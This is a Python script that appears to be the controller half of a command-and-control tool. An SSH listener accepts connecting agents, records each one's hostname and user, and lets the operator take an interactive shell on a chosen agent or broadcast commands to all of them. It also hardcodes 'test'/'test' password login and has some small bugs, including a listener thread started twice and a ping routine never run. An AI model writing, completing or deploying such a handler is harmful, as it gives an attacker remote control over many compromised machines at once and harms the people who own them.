#! /usr/bin/env python3

import paramiko, os, socket, threading, pty, sys, tty
import termios
import time, datetime
import queue
from random import randint

host_key = paramiko.RSAKey(filename='key/id_rsa-serv')
killme = False
clientlist = []
port = 5002

def cropkey(skey):
    data = skey.key_blob.split(' ')[1]
    print(data)
    return data

with open('./key/cli/id_rsa.pub','r') as kf:
    ckey = paramiko.pkey.PublicBlob('ssh-rsa',kf.read().strip('\n'))
check_key = cropkey(ckey)

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
    def check_auth_password(self, username, key):
        if username == 'test' and key == 'test':
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_auth_publickey(self, username, key):
        print(check_key +'  '+key.get_base64())
        if username == 'test' and key.get_base64() == check_key:
            print('ouiiii')
           #if key
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


class Client(threading.Thread):
    def __init__(self, client):
        super(Client, self).__init__()
        self.client = client
        self.inbound = queue.SimpleQueue()
        self.outbound = queue.SimpleQueue()

    def listen(self):
        while True:
            if self.chan.recv_ready() is True:
                data = self.chan.recv(1024)
                if data == b'pong':
                    self.status = True
                self.inbound.put(data)

    def ping(self):
        while True:
            for i in range(6):
                time.sleep(1)

            self.status = None
            self.chan.send('ping')
            for i in range(1200):
                if self.status is True:
                    break
            if self.status is None:
                self.status = False




    def run(self):
        with paramiko.Transport(self.client) as t:
            t.load_server_moduli()
            t.add_server_key(host_key)
            server = Server()
            t.start_server(server=server)

            self.chan = t.accept(20)
            hostname = self.chan.recv(2014).decode()
            self.hostname = str(hostname)
            user = self.chan.recv(2014).decode()
            self.user = user
            self.id =  str(randint(1, 999))
            #self.conntime = TODO
            self.status = True

            lt = threading.Thread(target=self.listen, daemon=True)
            lt.start()
            pt = threading.Thread(target=self.listen, daemon=True)
            pt.start()

            while True:
                data = self.outbound.get()
                self.chan.sendall(data)

def sort_client(clist):
    a = []
    w = []
    for cli in clist:
        if cli.status == False:
            clist.remove(cli)
        elif cli.status == True:
            a.append(cli)
        elif cli.status == None:
            w.append(cli)
    return w + a


def input_loop(pipe):
    global killme
    orig_settings = termios.tcgetattr(sys.stdin)
    tty.setcbreak(sys.stdin)
    try :
        while True:
            x=sys.stdin.read(1)[0]
            pipe.put(x)
            time.sleep(0.01)
    except :
        killme = True
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, orig_settings)
        return

def broadcast(li, cmd):
    for c in li:
        c.outbound.put(cmd)

def print_cli(pipe):
    global killme
    while True:
        if killme == True:
            break
        else:
            if not pipe.empty():
                data = pipe.get()#.decode()
                try:
                    pdata = data.decode()
                except AttributeError:
                    pdata = data
                #print(pdata, end='')
                sys.stdout.write(pdata)

def run():
    global clientlist
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('127.0.0.1', port))
        s.listen()
        print('Server active - listening for request')
        while True:
            client, addr = s.accept()
            conn = Client(client)
            conn.start()
            clientlist.append(conn)

def list_client(li):
    li = sort_client(li)
    i = 0
    print(li)
    for client in li:
        print('{} \t Hostname : {} \t User : {} \t ID : {} '.format(i, client.hostname, client.user, client.id))
        i += 1

t = threading.Thread(target=run, daemon=True)
t.start()

while len(clientlist) == 0:
    time.sleep(1)

time.sleep(2)
while True:

    c = input(' 1/l - list client \n 2/u - use client \n 3/b - send command to all client \n > ')
    if c == '1' or c == 'l':
        list_client(clientlist)
    elif c == '2' or c == 'u':
        list_client(clientlist)

        cli_choice = int(input(' Select line number of desired client \n (ID is used to identify same hostname+user combination) \n > '))

        client = clientlist[cli_choice]
        lt = threading.Thread(target=print_cli, args=(client.inbound,))
        lt.start()
        input_loop(client.outbound)
    elif c == '3' or c == 'b':
        cmd = input(' BROADCAST > ')
        broadcast(clientlist, cmd)
